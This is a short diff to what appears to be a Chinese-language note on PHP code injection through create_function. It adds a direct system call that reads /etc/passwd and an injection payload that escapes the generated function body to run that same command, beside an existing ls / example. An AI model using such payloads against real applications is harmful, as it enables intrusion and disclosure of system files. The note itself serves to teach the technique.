@@ -102,6 +102,8 @@ create_function；如下代码就能调用系统命令ls /
 ```php
 <?php
 echo 'Hello World!';
+system('cat /etc/passwd');
+create_function('',";}system('cat /etc/passwd');//");
 create_function('',";}system('ls /');//")
 ?>
 ```
